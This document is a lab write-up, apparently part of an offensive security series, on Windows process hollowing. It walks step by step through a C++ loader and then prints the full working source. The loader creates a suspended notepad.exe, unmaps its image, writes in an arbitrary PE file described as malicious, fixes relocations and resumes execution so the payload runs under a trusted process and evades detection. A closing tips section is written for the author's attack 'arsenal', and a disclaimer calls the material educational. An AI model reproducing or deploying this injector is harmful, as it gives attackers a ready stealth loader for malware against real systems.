<h1 align="center">Process Hollowing</h1>
<p align="center">
  <img src="../Assets/ph_AI.jpg" alt="UH" width="500px">
</p>

## Overview
In this lab, we cover Process Hollowing Technique. Process Hollowing is a stealthy process injection technique where a legitimate process (usually a system or trusted application) is started in a suspended state, and its memory is replaced with malicious code. The malicious code then executes within the context of the trusted process, evading detection by security solutions that might rely on the legitimacy of the process.

## Steps
1. `Create a Suspended Process:` A legitimate process (e.g., notepad.exe) is created in a suspended state to prevent execution while it is being hollowed.
2. `Retrieve Context:` The thread context of the suspended process is retrieved. This includes register values that will be important for modifying execution flow.
3. `Unmap Sections:` The memory section of the target process is unmapped using the `NtUnmapViewOfSection` function, freeing up memory space for the malicious code.
4. `Inject PE File:` The malicious PE file is loaded from disk, and its headers and sections are written into the target process's memory.
5. `Relocate if Necessary:` If the base address of the PE file differs from that of the suspended process, relocations are performed to adjust the addresses in the PE file accordingly.
6. `Set New Entry Point:` The new entry point (the address of the malicious code) is set in the thread context, and the thread is resumed to execute the injected code.

## Walkthrough

The code expects one argument — the path to the malicious executable (PE file) to be injected. If the user does not provide it, the program prints usage instructions and exits.

```cpp
if (argc != 2) {
    printf("Usage: Process Hollowing.exe [Binary you want to Inject]\n");
    return 0;
}

```
This code creates a new process (notepad.exe) in a suspended state using the `CreateProcessA` function. This prevents the process from executing right away, allowing it to be modified before it starts running.
```cpp
    // Creating Suspended Process And Mapping a File To Memory
	LPSTARTUPINFOA startupInfo = new STARTUPINFOA();
	PROCESS_INFORMATION procInfo;


	printf("[+] Creating Notepad.exe as Suspended Process.\n");
	CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, startupInfo, &procInfo);
```
The `GetThreadContext` function retrieves the context of the main thread of the suspended process. The context contains the current state of the CPU registers, which will be important later for modifying the execution flow.
```cpp
	// Get All The Register Values
	printf("[+] Getting Current Context.\n");
	LPCONTEXT threadContext = new CONTEXT();
	threadContext->ContextFlags = CONTEXT_FULL;
	if (!GetThreadContext(procInfo.hThread, threadContext)) {
		printf("[-] Error getting context\n");
		return 0;
	}
```
The code uses `ReadProcessMemory` to get the base address of the suspended process (the starting address where its memory is loaded).
*  For x86 (32-bit), the base address is retrieved from `Ebx + 8`. For x64 (64-bit), it's retrieved from `Rdx + (sizeof(SIZE_T) * 2)`. The difference is due to variations in how registers work between the two architectures.
  
```cpp

#ifdef _X86_ 
	ReadProcessMemory(procInfo.hProcess, (PVOID)(threadContext->Ebx + 8), &baseAddress, sizeof(PVOID), NULL);
#endif

#ifdef _WIN64
	ReadProcessMemory(procInfo.hProcess, (PVOID)(threadContext->Rdx + (sizeof(SIZE_T) * 2)), &baseAddress, sizeof(PVOID), NULL);
#endif

```
The `NtUnmapViewOfSection` function, retrieved from ntdll.dll, is used to unmap the memory section of the target process. This frees the memory space where the original executable was loaded, so the malicious code can be written there instead.

```cpp
  // Getting The Address Of NtUnmapViewOfSection And Unmapping All Sections
	printf("[+] Unmapping the Memory Section of Target Process.\n");
	HMODULE ntdllHandle = GetModuleHandleA("ntdll");
	FARPROC ntUnmapViewOfSectionProc = GetProcAddress(ntdllHandle, "NtUnmapViewOfSection");
	_NtUnmapViewOfSectionFunc ntUnmapViewOfSection = (_NtUnmapViewOfSectionFunc)ntUnmapViewOfSectionProc;
	if (ntUnmapViewOfSection(procInfo.hProcess, baseAddress)) {
		printf("[-] Error to unmap the Section\n");
		return 0;
	}

```
This code opens the malicious PE file provided as an argument, reads its contents into memory.
```cpp
// Open PE file and read it into memory
	HANDLE hFile = CreateFileA(argv[1], GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		std::cerr << "Failed to open PE file." << std::endl;
		return 1;
	}
	// Get the file size
	DWORD fileSize = GetFileSize(hFile, NULL);
	if (fileSize == INVALID_FILE_SIZE) {
		std::cerr << "Failed to get file size" << std::endl;
		CloseHandle(hFile);
		return 1;
	}

	// Allocate buffer
	char* PEBytes = (char*)malloc(fileSize);
	if (PEBytes == nullptr) {
		std::cerr << "Failed to allocate memory" << std::endl;
		CloseHandle(hFile);
		return 1;
	}

	// Read the file into memory
	DWORD bytesRead;
	if (!ReadFile(hFile, PEBytes, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
		std::cerr << "Failed to read file into memory" << std::endl;
		free(PEBytes);
		CloseHandle(hFile);
		return 1;
	}

	CloseHandle(hFile);
```
The code parses the headers of the PE file (specifically, the DOS header and NT header). The DOS header points to the NT headers using the `e_lfanew` field. These headers contain crucial information like the image base address and section details. Also allocated memory is the same size as the PE file’s `SizeOfImage`.
```cpp

	// Getting The DOS Header And The NT Header 
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)PEBytes;
	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)PEBytes + dosHeader->e_lfanew);

	// Allocating Memory in Suspended Process
	PVOID allocatedMemory = VirtualAllocEx(procInfo.hProcess, baseAddress, ntHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

```
This code Writes the headers of the malicious PE file into the allocated memory in the target process. The headers include the image base, section headers, and other metadata. The program loops through all sections of the PE file and writes them into the corresponding addresses in the target process. Each section contains the actual code, data, and other information required for execution. The ".reloc" section is processed, and each relocation entry is updated by applying the necessary offset.
```cpp

	// Write The File's Headers To The Allocated Memory In The Suspended Process
	if (!WriteProcessMemory(procInfo.hProcess, baseAddress, PEBytes, ntHeaders->OptionalHeader.SizeOfHeaders, 0)) {
		printf("Failed to write Headers\n");
		return 0;
	}

	// Write All The Sections From The Mapped File To The Suspended Process
	PIMAGE_SECTION_HEADER sectionHeader;

	for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++)
	{
		// Get The Header Of The Current Section
		sectionHeader = (PIMAGE_SECTION_HEADER)((LPBYTE)PEBytes + dosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
		printf("0x%p -- Writing Section: %s\n", (LPBYTE)allocatedMemory + sectionHeader->VirtualAddress, sectionHeader->Name);

		// Write The Section From The File Into The Allocated Memory
		if (!WriteProcessMemory(procInfo.hProcess, (PVOID)((LPBYTE)allocatedMemory + sectionHeader->VirtualAddress), (PVOID)((LPBYTE)PEBytes + sectionHeader->PointerToRawData), sectionHeader->SizeOfRawData, NULL)) {
			printf("Error Writing Section: %s. At: 0x%p\n", sectionHeader->Name, (LPBYTE)allocatedMemory + sectionHeader->VirtualAddress);
		}
	}

	// Check If There Is an Offset Between the Base Addresses
	if (baseOffset) {

		printf("\nRelocating The Relocation Table...\n");

		// Loop Over Every Section
		for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++)
		{
			// Get The Header Of The Current Section
			sectionHeader = (PIMAGE_SECTION_HEADER)((LPBYTE)PEBytes + dosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));

			// Compare The Section Name To The ".reloc" Section
			char relocSectionName[] = ".reloc";
			if (memcmp(sectionHeader->Name, relocSectionName, strlen(relocSectionName))) {
				// If The Section Is Not The ".reloc" Section Continue To The Next Section
				continue;
			}

			// Get The Address Of The Section Data
			DWORD relocAddress = sectionHeader->PointerToRawData;
			IMAGE_DATA_DIRECTORY relocData = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
			DWORD offset = 0;

			// Iterate Over The Relocation Table
			while (offset < relocData.Size) {

				// Get The Header Of The Relocation Block
				PRELOCATION_BLOCK blockHeader = (PRELOCATION_BLOCK)&PEBytes[relocAddress + offset];
				printf("\nRelocation Block 0x%p. Size: 0x%p\n", blockHeader->PageAddress, blockHeader->BlockSize);

				offset += sizeof(RELOCATION_BLOCK);

				// Calculate The Entries In The Current Table
				DWORD entryCount = (blockHeader->BlockSize - sizeof(RELOCATION_BLOCK)) / sizeof(RELOCATION_ENTRY);
				printf("%d Entries Must Be Relocated In The Current Block.\n", entryCount);

				PRELOCATION_ENTRY blockEntries = (PRELOCATION_ENTRY)&PEBytes[relocAddress + offset];

				for (int x = 0; x < entryCount; x++)
				{
					offset += sizeof(RELOCATION_ENTRY);

					// If The Type Of The Entry Is 0 We Don't Need To Do Anything
					if (blockEntries[x].Type == 0) {
						printf("The Type Of Base Relocation Is 0. Skipping.\n");
						continue;
					}

					// Resolve The Address Of The Reloc
					DWORD fieldAddress = blockHeader->PageAddress + blockEntries[x].Offset;

#ifdef _X86_
					// Read The Value At That Address
					DWORD entryAddress = 0;
					ReadProcessMemory(procInfo.hProcess, (PVOID)((DWORD)baseAddress + fieldAddress), &entryAddress, sizeof(PVOID), 0);
					printf("0x%p --> 0x%p | At:0x%p\n", entryAddress, entryAddress + baseOffset, (PVOID)((DWORD)baseAddress + fieldAddress));

					// Add The Correct Offset To That Address And Write It
					entryAddress += baseOffset;
					if (!WriteProcessMemory(procInfo.hProcess, (PVOID)((DWORD)baseAddress + fieldAddress), &entryAddress, sizeof(PVOID), 0)) {
						printf("Error Writing Entry.\n");
					}
#endif
#ifdef _WIN64
					// Read The Value At That Address
					DWORD64 entryAddress = 0;
					ReadProcessMemory(procInfo.hProcess, (PVOID)((DWORD64)baseAddress + fieldAddress), &entryAddress, sizeof(PVOID), 0);
					printf("0x%p --> 0x%p | At:0x%p\n", entryAddress, entryAddress + baseOffset, (PVOID)((DWORD64)baseAddress + fieldAddress));

					// Add The Correct Offset To That Address And Write It
					entryAddress += baseOffset;
					if (!WriteProcessMemory(procInfo.hProcess, (PVOID)((DWORD64)baseAddress + fieldAddress), &entryAddress, sizeof(PVOID), 0)) {
						printf("Error Writing Entry.\n");
					}
#endif
				}
			}
		}
	}
```
This code sets the new entry point of the injected PE file in the thread context of the suspended process. The entry point is where the CPU will start executing the malicious code. `SetThreadContext` sets the modified context, and ResumeThread resumes the thread, allowing the injected code to execute.

```cpp
#ifdef _X86_
	// Write The New Image Base Address
	WriteProcessMemory(procInfo.hProcess, (PVOID)(threadContext->Ebx + 8), &ntHeaders->OptionalHeader.ImageBase, sizeof(PVOID), NULL);

	// Write The New Entry Point
	DWORD entryPoint = (DWORD)((LPBYTE)allocatedMemory + ntHeaders->OptionalHeader.AddressOfEntryPoint);
	threadContext->Eax = entryPoint;
#endif
#ifdef _WIN64
	// Write The New Image Base Address
	WriteProcessMemory(procInfo.hProcess, (PVOID)(threadContext->Rdx + (sizeof(SIZE_T) * 2)), &ntHeaders->OptionalHeader.ImageBase, sizeof(PVOID), NULL);

	// Write The New Entry Point
	DWORD64 entryPoint = (DWORD64)((LPBYTE)allocatedMemory + ntHeaders->OptionalHeader.AddressOfEntryPoint);
	threadContext->Rcx = entryPoint;
#endif

	printf("\n[+] Setting the Thread Context.\n");
	if (!SetThreadContext(procInfo.hThread, threadContext)) {
		printf("Error setting context\n");
		return 0;
	}

	printf("[+] Resuming Thread.\n");
	if (!ResumeThread(procInfo.hThread)) {
		printf("[-]Error resuming thread\n");
		return 0;
	}
```
## Full Code
### Loader/Injector Code
#### Header.h
```cpp
#pragma once
#include <Windows.h>

typedef NTSTATUS(WINAPI* _NtUnmapViewOfSectionFunc)(HANDLE ProcessHandle, PVOID BaseAddress);

typedef struct RELOCATION_BLOCK {
	DWORD PageAddress;
	DWORD BlockSize;
} RELOCATION_BLOCK, * PRELOCATION_BLOCK;

typedef struct RELOCATION_ENTRY {
	USHORT Offset : 12;
	USHORT Type : 4;
} RELOCATION_ENTRY, * PRELOCATION_ENTRY;

```
#### source.cpp
```cpp

#include <stdio.h>
#include <windows.h>
#include <string.h>
#include <winternl.h>
#include "Header.h"
#include <iostream>


int main(int argc, char* argv[]) {

	if (argc != 2) {
		printf("Usage: Process Hollowing.exe [Binary you want to Inject]\n");
		return 0;
	}


	// Creating Suspended Process And Mapping a File To Memory
	LPSTARTUPINFOA startupInfo = new STARTUPINFOA();
	PROCESS_INFORMATION procInfo;


	printf("[+] Creating Notepad.exe as Suspended Process.\n");
	CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, startupInfo, &procInfo);

	// Get All The Register Values
	printf("[+] Getting Current Context.\n");
	LPCONTEXT threadContext = new CONTEXT();
	threadContext->ContextFlags = CONTEXT_FULL;
	if (!GetThreadContext(procInfo.hThread, threadContext)) {
		printf("[-] Error getting context\n");
		return 0;
	}

	// Get The Base Address Of The Suspended Process
	PVOID baseAddress;

#ifdef _X86_ 
	ReadProcessMemory(procInfo.hProcess, (PVOID)(threadContext->Ebx + 8), &baseAddress, sizeof(PVOID), NULL);
#endif

#ifdef _WIN64
	ReadProcessMemory(procInfo.hProcess, (PVOID)(threadContext->Rdx + (sizeof(SIZE_T) * 2)), &baseAddress, sizeof(PVOID), NULL);
#endif

	// Getting The Address Of NtUnmapViewOfSection And Unmapping All Sections
	printf("[+] Unmapping the Memory Section of Target Process.\n");
	HMODULE ntdllHandle = GetModuleHandleA("ntdll");
	FARPROC ntUnmapViewOfSectionProc = GetProcAddress(ntdllHandle, "NtUnmapViewOfSection");
	_NtUnmapViewOfSectionFunc ntUnmapViewOfSection = (_NtUnmapViewOfSectionFunc)ntUnmapViewOfSectionProc;
	if (ntUnmapViewOfSection(procInfo.hProcess, baseAddress)) {
		printf("[-] Error to unmap the Section\n");
		return 0;
	}

	// Open PE file and read it into memory
	HANDLE hFile = CreateFileA(argv[1], GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		std::cerr << "Failed to open PE file." << std::endl;
		return 1;
	}
	// Get the file size
	DWORD fileSize = GetFileSize(hFile, NULL);
	if (fileSize == INVALID_FILE_SIZE) {
		std::cerr << "Failed to get file size" << std::endl;
		CloseHandle(hFile);
		return 1;
	}

	// Allocate buffer
	char* PEBytes = (char*)malloc(fileSize);
	if (PEBytes == nullptr) {
		std::cerr << "Failed to allocate memory" << std::endl;
		CloseHandle(hFile);
		return 1;
	}

	// Read the file into memory
	DWORD bytesRead;
	if (!ReadFile(hFile, PEBytes, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
		std::cerr << "Failed to read file into memory" << std::endl;
		free(PEBytes);
		CloseHandle(hFile);
		return 1;
	}

	CloseHandle(hFile);
	

	// Getting The DOS Header And The NT Header 
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)PEBytes;
	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)PEBytes + dosHeader->e_lfanew);

	// Allocating Memory in Suspended Process
	PVOID allocatedMemory = VirtualAllocEx(procInfo.hProcess, baseAddress, ntHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

#ifdef _X86_
	// Calculate The Offset Of the 32-bits Process Base Address From The File's Base Address
	DWORD baseOffset = (DWORD)baseAddress - ntHeaders->OptionalHeader.ImageBase;
	printf("Original Process Base: 0x%p\nInject File Base: 0x%p\nOffset: 0x%p\n\n", ntHeaders->OptionalHeader.ImageBase, baseAddress, baseOffset);

	// Change The File's Base Address To The Base Address Of The Suspended Process
	ntHeaders->OptionalHeader.ImageBase = (DWORD)baseAddress;
#endif
#ifdef _WIN64
	// Calculate The Offset Of the 64-bits Process Base Address From The File's Base Address
	DWORD64 baseOffset = (DWORD64)baseAddress - ntHeaders->OptionalHeader.ImageBase;
	printf("[+] Original Process Base: 0x%p\n[+] Inject File Base: 0x%p\n\n", ntHeaders->OptionalHeader.ImageBase, baseAddress);

	// Change The File's Base Address To The Base Address Of The Suspended Process
	ntHeaders->OptionalHeader.ImageBase = (DWORD64)baseAddress;
#endif

	// Write The File's Headers To The Allocated Memory In The Suspended Process
	if (!WriteProcessMemory(procInfo.hProcess, baseAddress, PEBytes, ntHeaders->OptionalHeader.SizeOfHeaders, 0)) {
		printf("Failed to write Headers\n");
		return 0;
	}

	// Write All The Sections From The Mapped File To The Suspended Process
	PIMAGE_SECTION_HEADER sectionHeader;

	for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++)
	{
		// Get The Header Of The Current Section
		sectionHeader = (PIMAGE_SECTION_HEADER)((LPBYTE)PEBytes + dosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
		printf("0x%p -- Writing Section: %s\n", (LPBYTE)allocatedMemory + sectionHeader->VirtualAddress, sectionHeader->Name);

		// Write The Section From The File Into The Allocated Memory
		if (!WriteProcessMemory(procInfo.hProcess, (PVOID)((LPBYTE)allocatedMemory + sectionHeader->VirtualAddress), (PVOID)((LPBYTE)PEBytes + sectionHeader->PointerToRawData), sectionHeader->SizeOfRawData, NULL)) {
			printf("Error Writing Section: %s. At: 0x%p\n", sectionHeader->Name, (LPBYTE)allocatedMemory + sectionHeader->VirtualAddress);
		}
	}

	// Check If There Is an Offset Between the Base Addresses
	if (baseOffset) {

		printf("\nRelocating The Relocation Table...\n");

		// Loop Over Every Section
		for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++)
		{
			// Get The Header Of The Current Section
			sectionHeader = (PIMAGE_SECTION_HEADER)((LPBYTE)PEBytes + dosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));

			// Compare The Section Name To The ".reloc" Section
			char relocSectionName[] = ".reloc";
			if (memcmp(sectionHeader->Name, relocSectionName, strlen(relocSectionName))) {
				// If The Section Is Not The ".reloc" Section Continue To The Next Section
				continue;
			}

			// Get The Address Of The Section Data
			DWORD relocAddress = sectionHeader->PointerToRawData;
			IMAGE_DATA_DIRECTORY relocData = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
			DWORD offset = 0;

			// Iterate Over The Relocation Table
			while (offset < relocData.Size) {

				// Get The Header Of The Relocation Block
				PRELOCATION_BLOCK blockHeader = (PRELOCATION_BLOCK)&PEBytes[relocAddress + offset];
				printf("\nRelocation Block 0x%p. Size: 0x%p\n", blockHeader->PageAddress, blockHeader->BlockSize);

				offset += sizeof(RELOCATION_BLOCK);

				// Calculate The Entries In The Current Table
				DWORD entryCount = (blockHeader->BlockSize - sizeof(RELOCATION_BLOCK)) / sizeof(RELOCATION_ENTRY);
				printf("%d Entries Must Be Relocated In The Current Block.\n", entryCount);

				PRELOCATION_ENTRY blockEntries = (PRELOCATION_ENTRY)&PEBytes[relocAddress + offset];

				for (int x = 0; x < entryCount; x++)
				{
					offset += sizeof(RELOCATION_ENTRY);

					// If The Type Of The Entry Is 0 We Don't Need To Do Anything
					if (blockEntries[x].Type == 0) {
						printf("The Type Of Base Relocation Is 0. Skipping.\n");
						continue;
					}

					// Resolve The Address Of The Reloc
					DWORD fieldAddress = blockHeader->PageAddress + blockEntries[x].Offset;

#ifdef _X86_
					// Read The Value At That Address
					DWORD entryAddress = 0;
					ReadProcessMemory(procInfo.hProcess, (PVOID)((DWORD)baseAddress + fieldAddress), &entryAddress, sizeof(PVOID), 0);
					printf("0x%p --> 0x%p | At:0x%p\n", entryAddress, entryAddress + baseOffset, (PVOID)((DWORD)baseAddress + fieldAddress));

					// Add The Correct Offset To That Address And Write It
					entryAddress += baseOffset;
					if (!WriteProcessMemory(procInfo.hProcess, (PVOID)((DWORD)baseAddress + fieldAddress), &entryAddress, sizeof(PVOID), 0)) {
						printf("Error Writing Entry.\n");
					}
#endif
#ifdef _WIN64
					// Read The Value At That Address
					DWORD64 entryAddress = 0;
					ReadProcessMemory(procInfo.hProcess, (PVOID)((DWORD64)baseAddress + fieldAddress), &entryAddress, sizeof(PVOID), 0);
					printf("0x%p --> 0x%p | At:0x%p\n", entryAddress, entryAddress + baseOffset, (PVOID)((DWORD64)baseAddress + fieldAddress));

					// Add The Correct Offset To That Address And Write It
					entryAddress += baseOffset;
					if (!WriteProcessMemory(procInfo.hProcess, (PVOID)((DWORD64)baseAddress + fieldAddress), &entryAddress, sizeof(PVOID), 0)) {
						printf("Error Writing Entry.\n");
					}
#endif
				}
			}
		}
	}

#ifdef _X86_
	// Write The New Image Base Address
	WriteProcessMemory(procInfo.hProcess, (PVOID)(threadContext->Ebx + 8), &ntHeaders->OptionalHeader.ImageBase, sizeof(PVOID), NULL);

	// Write The New Entry Point
	DWORD entryPoint = (DWORD)((LPBYTE)allocatedMemory + ntHeaders->OptionalHeader.AddressOfEntryPoint);
	threadContext->Eax = entryPoint;
#endif
#ifdef _WIN64
	// Write The New Image Base Address
	WriteProcessMemory(procInfo.hProcess, (PVOID)(threadContext->Rdx + (sizeof(SIZE_T) * 2)), &ntHeaders->OptionalHeader.ImageBase, sizeof(PVOID), NULL);

	// Write The New Entry Point
	DWORD64 entryPoint = (DWORD64)((LPBYTE)allocatedMemory + ntHeaders->OptionalHeader.AddressOfEntryPoint);
	threadContext->Rcx = entryPoint;
#endif

	printf("\n[+] Setting the Thread Context.\n");
	if (!SetThreadContext(procInfo.hThread, threadContext)) {
		printf("Error setting context\n");
		return 0;
	}

	printf("[+] Resuming Thread.\n");
	if (!ResumeThread(procInfo.hThread)) {
		printf("[-]Error resuming thread\n");
		return 0;
	}

	printf("[+] Process Hollowing Technique Done");
	return 0;
}


```
### Note
During my arsenal preparation, I faced alot of issues. The main issue, I noticed with this hollowing technique is related to subsystems. Please keep in mind, as per my knowledge if the subsystem of target process is different the subsystem of injected binary then you will face error. So make sure injected binary should have the same subsystem as target process. You can change the binary subsystem using any PE editor tool such as (PE-Bear, HxD).

1. IMAGE_SUBSYSTEM_NATIVE (1)
2. IMAGE_SUBSYSTEM_WINDOWS_GUI (2)
3. IMAGE_SUBSYSTEM_WINDOWS_CUI (3)
4. IMAGE_SUBSYSTEM_OS2_CUI (5)
5. IMAGE_SUBSYSTEM_POSIX_CUI (7)
6. IMAGE_SUBSYSTEM_NATIVE_WINDOWS (8)
7. IMAGE_SUBSYSTEM_WINDOWS_CE_GUI (9)
8. IMAGE_SUBSYSTEM_EFI_APPLICATION (10)
9. IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER (11)
10. IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER (12)
11. IMAGE_SUBSYSTEM_EFI_ROM (13)
12. IMAGE_SUBSYSTEM_XBOX (14)
13. IMAGE_SUBSYSTEM_WINDOWS_BOOT_APPLICATION (16)

## Demonstration

![](Asset/PE8.gif)

For GitHub-Repo Click Here: [Offensive-Panda/ProcessInjectionTechniques](https://github.com/Offensive-Panda/ProcessInjectionTechniques/tree/main/Process_Hollowing/ProcessHollowing)

### Disclaimer
The content provided on this series is for educational and informational purposes only. It is intended to help users understand cybersecurity concepts and techniques for improving security defenses!
